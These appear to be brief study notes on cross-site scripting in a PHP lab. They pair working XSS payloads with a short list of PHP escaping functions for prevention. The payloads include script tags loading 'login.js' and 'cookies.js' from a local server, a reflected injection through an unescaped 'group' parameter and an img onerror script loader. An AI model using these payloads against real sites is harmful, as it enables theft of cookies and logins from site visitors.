# Injections
<script src="http://127.0.0.1:6969/dvdAnimate.js"></script>
<script src="http://127.0.0.1:6969/login.js"></script>
<script src="http://127.0.0.1:6969/cookies.js"></script>
http://localhost:8000/?group=<script src="http://127.0.0.1:6969/dvdAnimate.js"></script>
  <?php echo $_GET['group']; ?>


<img onerror="var s=document.createElement('script');s.src='http://127.0.0.1:6969/login.js';document.body.appendChild(s)"/>

# Preventing
htmlspecialchars()
strip_tags()
addslashes()
htmlspecialchars($row["text"], ENT_QUOTES)
htmlspecialchars($_GET['username'])

